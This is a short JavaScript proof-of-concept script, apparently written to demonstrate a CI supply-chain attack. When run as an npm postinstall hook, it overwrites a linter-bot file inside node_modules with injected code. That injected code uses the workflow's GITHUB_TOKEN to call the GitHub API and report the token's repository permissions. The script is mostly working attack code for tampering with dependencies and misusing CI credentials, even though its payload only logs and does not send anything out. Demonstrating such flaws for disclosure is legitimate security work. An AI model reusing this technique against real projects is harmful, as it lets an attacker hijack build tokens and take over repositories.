const fs = require('fs');
const path = require('path');

const phase = process.argv[2] || 'unknown';
console.log(`[poc] attacker lifecycle script executed phase=${phase} uid=${process.getuid ? process.getuid() : '?'}`);
console.log(`[poc] cwd=${process.cwd()}`);
console.log(`[poc] GITHUB_REPOSITORY=${process.env.GITHUB_REPOSITORY} token_in_env=${Boolean(process.env.GITHUB_TOKEN)}`);

if (phase === 'postinstall') {
  const target = path.join('node_modules', 'adp-devsite-scripts', 'linter-bot', 'postLinterReport.js');
  const payload = [
    "console.log('[poc] STEP2 attacker code running with bot token len=' + String((process.env.GITHUB_TOKEN||'').length));",
    "const repo = process.env.GITHUB_REPOSITORY;",
    "fetch('https://api.github.com/repos/' + repo, { headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'X-GitHub-Api-Version': '2022-11-28' } })",
    "  .then(r => { console.log('[poc] STEP2 token-authenticated API status=' + r.status); return r.json(); })",
    "  .then(j => { console.log('[poc] STEP2 repo=' + j.full_name + ' admin=' + JSON.stringify(j.permissions)); });",
    ""
  ].join('\n');
  fs.writeFileSync(target, payload);
  console.log('[poc] overwrote ' + target);
}
